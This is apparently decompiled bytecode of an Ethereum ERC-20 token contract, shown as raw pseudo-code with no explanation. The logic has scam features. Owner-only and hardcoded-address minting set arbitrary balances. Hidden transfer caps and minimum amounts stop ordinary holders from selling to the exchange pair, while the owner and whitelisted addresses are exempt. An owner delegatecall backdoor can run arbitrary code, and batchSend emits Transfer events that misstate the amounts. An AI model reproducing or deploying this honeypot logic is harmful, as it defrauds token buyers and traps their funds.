contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint256 stor0;
mapping of uint8 stor1;
uint256 stor2;
uint256 stor3;
uint256 stor4;
address stor5;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
address stor11;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function setTradeAddress(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == stor11
    stor5 = arg1
    return 1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function _mints(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if stor11 != msg.sender:
        require 0x966ba5893e7fa30d0139e7ce81affc6a4d394ee2 == msg.sender
    if arg2:
        balanceOf[address(arg1)] = 10^18 * arg2
    stor1[address(arg1)] = 1
    return 1
}

function init(uint256 arg1, uint256 arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require msg.sender == stor11
    if arg2 > 0:
        stor2 = 10^18 * arg2
    else:
        stor2 = 0
    if arg3:
        stor3 = 10^18 * arg3
    else:
        stor3 = 0
    stor4 = arg1
    return 0
}

function delegate(address arg1, bytes arg2) payable {
    require calldata.size - 4 >= 64
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + arg2.length + 36 <= calldata.size
    mem[128 len arg2.length] = arg2[all]
    mem[arg2.length + 128] = 0
    require msg.sender == stor11
    mem[ceil32(arg2.length) + 128 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
    mem[ceil32(arg2.length) + floor32(arg2.length) + -(arg2.length % 32) + 160 len arg2.length % 32] = mem[floor32(arg2.length) + -(arg2.length % 32) + 160 len arg2.length % 32]
    delegate arg1 with:
       funct (Mask(32, -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256, 0) >> -(8 * ceil32(arg2.length) + -arg2.length + 4) + 256)
         gas gas_remaining wei
        args mem[ceil32(arg2.length) + 132 len arg2.length - 4]
}

function batchSend(address[] arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    require msg.sender == stor11
    require arg2 * arg1.length <= balanceOf[msg.sender]
    balanceOf[msg.sender] += -1 * arg2 * arg1.length
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        _19 = mem[(32 * idx) + 128]
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 6
        balanceOf[mem[(32 * idx) + 140 len 20]] += arg2
        emit Transfer((arg2 / 2), msg.sender, mem[(32 * idx) + 140 len 20]);
        mem[(32 * arg1.length) + 128] = arg2 / 2
        emit Transfer((arg2 / 2), msg.sender, address(_19));
        idx = idx + 1
        continue 
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3:
        if arg1 != msg.sender:
            require arg3 <= allowance[address(arg1)][msg.sender]
            allowance[address(arg1)][msg.sender] -= arg3
        if 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 < this.address:
            if stor11 != arg1:
                if stor11 != arg2:
                    if arg1 != 0x7a250d5630b4cf539739df2c5dacb4c659f2488d:
                        if arg1 != address(sha3(0, 6659063423423185226, sha3(13847067169082572429, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if stor5 != arg1:
                                if not stor1[address(arg1)]:
                                    if 0 == stor4:
                                        if not stor2:
                                            require stor3
                                    if stor4:
                                        require stor0[address(arg1)] < stor4
                                    if stor2:
                                        require stor2 <= arg3
                                    if stor3:
                                        require arg3 <= stor3
        else:
            if stor11 != arg1:
                if stor11 != arg2:
                    if arg1 != 0x7a250d5630b4cf539739df2c5dacb4c659f2488d:
                        if arg1 != address(sha3(0, 6659063423423185226, sha3(this.address, 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)):
                            if stor5 != arg1:
                                if not stor1[address(arg1)]:
                                    if 0 == stor4:
                                        if not stor2:
                                            require stor3
                                    if stor4:
                                        require stor0[address(arg1)] < stor4
                                    if stor2:
                                        require stor2 <= arg3
                                    if stor3:
                                        require arg3 <= stor3
        require arg3 <= balanceOf[address(arg1)]
        balanceOf[address(arg1)] -= arg3
        balanceOf[arg2] += arg3
        stor0[address(arg1)]++
        emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2:
        if msg.sender != msg.sender:
            require arg2 <= allowance[address(msg.sender)][msg.sender]
            allowance[address(msg.sender)][msg.sender] -= arg2
        if 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 < this.address:
            if stor11 != msg.sender:
                if stor11 != arg1:
                    if msg.sender != 0x7a250d5630b4cf539739df2c5dacb4c659f2488d:
                        if address(sha3(0, 6659063423423185226, sha3(13847067169082572429, this.address), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                            if stor5 != msg.sender:
                                if not stor1[address(msg.sender)]:
                                    if 0 == stor4:
                                        if not stor2:
                                            require stor3
                                    if stor4:
                                        require stor0[address(msg.sender)] < stor4
                                    if stor2:
                                        require stor2 <= arg2
                                    if stor3:
                                        require arg2 <= stor3
        else:
            if stor11 != msg.sender:
                if stor11 != arg1:
                    if msg.sender != 0x7a250d5630b4cf539739df2c5dacb4c659f2488d:
                        if address(sha3(0, 6659063423423185226, sha3(this.address, 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2), 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f)) != msg.sender:
                            if stor5 != msg.sender:
                                if not stor1[address(msg.sender)]:
                                    if 0 == stor4:
                                        if not stor2:
                                            require stor3
                                    if stor4:
                                        require stor0[address(msg.sender)] < stor4
                                    if stor2:
                                        require stor2 <= arg2
                                    if stor3:
                                        require arg2 <= stor3
        require arg2 <= balanceOf[address(msg.sender)]
        balanceOf[address(msg.sender)] -= arg2
        balanceOf[arg1] += arg2
        stor0[address(msg.sender)]++
        emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
